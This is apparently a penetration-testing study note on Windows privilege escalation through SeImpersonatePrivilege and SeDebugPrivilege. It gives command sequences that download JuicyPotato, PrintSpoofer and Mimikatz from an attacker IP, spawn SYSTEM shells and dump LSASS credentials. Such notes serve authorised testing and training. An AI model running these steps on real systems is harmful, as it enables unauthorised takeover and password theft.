### References

- [Juicy Potato GitHub Repository](https://github.com/ohpe/juicy-potato)
- [FoxGlove Security: Rotten Potato Attack](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
- [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [LOLBAS Project](https://lolbas-project.github.io/#)

---

!!! tip "Tip"
    SeImpersonatePrivilege is the most common Windows privesc in HTB and real engagements. Use `PrintSpoofer`, `RoguePotato`, or `GodPotato` depending on Windows version. `whoami /priv` is always the first check.

## SeImpersonatePrivilege Exploitation

### Overview

`SeImpersonatePrivilege` allows a process to impersonate another security context. This is commonly granted to service accounts and can be exploited using various token impersonation techniques.

### Identifying SeImpersonatePrivilege

Check if the current user has `SeImpersonatePrivilege`:

```powershell
whoami /priv | findstr /i "SeImpersonate"
```

If enabled, privilege escalation can be attempted using token impersonation.

### Exploiting SeImpersonatePrivilege

#### Juicy Potato (Windows < 10 1809 / Server 2019)

Juicy Potato exploits COM object activation to escalate privileges to SYSTEM.

1. Transfer Juicy Potato to the target:
    
    ```powershell
    iwr -uri http://192.168.45.226/JuicyPotato.exe -OutFile JuicyPotato.exe
    ```
    
2. Execute with an appropriate CLSID:
    
    ```powershell
    JuicyPotato.exe -l 1337 -p cmd.exe -t *
    ```
    
3. If successful, a new command shell as SYSTEM will be obtained.
    

#### PrintSpoofer (Windows 10 1809+)

PrintSpoofer exploits the `SeImpersonatePrivilege` by abusing named pipes:

1. Transfer PrintSpoofer:
    
    ```powershell
    iwr -uri http://192.168.45.226/PrintSpoofer.exe -OutFile PrintSpoofer.exe
    ```
    
2. Execute with:
    
    ```powershell
    .\PrintSpoofer.exe -i -c cmd
    ```
    

This should elevate the shell to SYSTEM.

---

## SeDebugPrivilege Exploitation

### Overview

`SeDebugPrivilege` allows a user to debug and modify system processes, including those running as SYSTEM.

### Identifying SeDebugPrivilege

Check if the current user has `SeDebugPrivilege`:

```powershell
whoami /priv | findstr /i "SeDebug"
```

If enabled, this can be used to dump credentials from `LSASS` or manipulate privileged processes.

### Exploiting SeDebugPrivilege

#### Extracting Credentials from LSASS

If `SeDebugPrivilege` is enabled, Mimikatz can be used to dump credentials.

1. Transfer Mimikatz:
    
    ```powershell
    iwr -uri http://192.168.45.226/mimikatz.exe -OutFile mimikatz.exe
    ```
    
2. Run Mimikatz:
    
    ```powershell
    mimikatz.exe
    ```
    
3. Enable privileges:
    
    ```mimikatz
    privilege::debug
    ```
    
4. Dump credentials:
    
    ```mimikatz
    sekurlsa::logonpasswords
    ```
    

This will extract credentials from memory, including NTLM hashes and plaintext passwords.

#### Creating a SYSTEM Shell

With `SeDebugPrivilege`, a SYSTEM shell can be obtained by injecting into `winlogon.exe`:

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # process::list
mimikatz # process::open winlogon.exe
mimikatz # process::token
mimikatz # process::run
```

This will spawn a new SYSTEM shell.